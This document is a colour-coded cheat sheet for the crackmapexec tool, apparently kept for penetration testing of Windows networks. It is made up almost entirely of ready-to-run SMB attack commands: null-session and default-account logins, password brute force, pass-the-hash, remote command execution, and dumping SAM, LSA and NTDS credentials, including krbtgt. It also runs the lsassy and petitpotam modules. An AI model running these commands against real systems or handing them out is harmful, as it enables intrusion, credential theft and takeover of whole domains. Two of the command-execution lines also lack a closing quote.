\033[0;34m##################################################################
\033[1;35m=== crackmapexec ===\033[0m
\033[0;31m- install via pipx -\033[0m
python3 -m pip install pipx
pipx ensurepath
pipx install crackmapexec

\033[1;35m== SMB ==\033[0m
\033[0;31m- smb (nullsession) (will tell you the netbios name & domain name -\033[0m
crackmapexec smb <ip_address> -u '' -p ''   \033[0;31m(if nullsession cont below)\033[0m
crackmapexec smb <ip_address> -u '' -p '' --shares
crackmapexec smb <ip_address> -u '' -p '' --users

\033[0;31m- smb (log output) -\033[0m
crackmapexec smb <ip_address> -u '<user>' -p '<password>' --rid-brute --log ./example.log

\033[0;31m- smb (trying common accounts) -\033[0m
crackmapexec smb <ip_address> -u 'guest' -p ''
crackmapexec smb <ip_address> -u 'DefaultAccount' -p ''
crackmapexec smb <ip_address> -u 'Administrator' -p ''
crackmapexec smb <ip_address> -u 'WDAGUtilityAccount' -p ''

\033[0;31m- smb (Password brute force) -\033[0m
crackmapexec smb <ip_address> -u '<user>' -p '<password_file>'

\033[0;31m- smb rid-brute (Enumerate users & groups) (requires access to an account) -\033[0m
crackmapexec smb <ip_address> -u '<user>' -p '<password>' --rid-brute

\033[0;31m- smb (kerberos authentication) -\033[0m
crackmapexec smb <ip_address> -u '<user>' -p '<password>' -k

\033[0;31m- smb (authenticating with hash) -\033[0m
crackmapexec smb <ip_address> -u '<user>' -H '<hash>'

\033[0;31m- smb (Execute command) (CMD) -\033[0m
crackmapexec smb <ip_address> -u '<user>' -p '<password>' -x '<command>

\033[0;31m- smb (Execute command) (PS) -\033[0m
crackmapexec smb <ip_address> -u '<user>' -p '<password>' -X '<command>

\033[0;31m- smb (Execute command) (Specific exec method) -\033[0m
crackmapexec smb <ip_address> -u '<user>' -p '<password>' -X '<command>' --exec-method <atexec/wmiexec/smbexec/mmcexec>

\033[0;31m- Dumping the SAM hashes (If you have admin rights) -\033[0m
crackmapexec smb <ip_address> -u '<Administrator>' -p '<password>' --sam

\033[0;31m- Dumping the LSA secrets (If you have admin rights) -\033[0m
crackmapexec smb <ip_address> -u '<Administrator>' -p '<password>' --lsa

\033[0;31m- Dumping the NTDS (Requires domain controller account) -\033[0m
crackmapexec smb <ip_address> -u '<user>' -p '<password>' --ntds
crackmapexec smb <ip_address> -u '<user>' -H '<hash>' --ntds

\033[1;31m"krbtgt" user can impersonate as anyone, hence it is more interesting than "Administrator".\33[0m
crackmapexec smb <ip_address> -u '<user>' -p '<password>' --ntds --user <krbtgt>
crackmapexec smb <ip_address> -u '<user>' -H '<hash>' --ntds --user <krbtgt>

\033[0;31m- List modules for the SMB protocol -\033[0m
crackmapexec smb --list-modules

\033[1;31mExample modules:\033[0m
\033[0;31m- lsassy (like mimikatz) -\033[0m
crackmapexec smb <ip_address> -u '<user>' -p '<password>' -M lsassy

\033[0;31m- petitpotam -\033[0m
crackmapexec smb <ip_address> -u '<user>' -p '<password>' -M petitpotam
crackmapexec smb <ip_address> -u '<user>' -p '<password>' -M petitpotam --options

\033[0;34m##################################################################\033[0m
\n

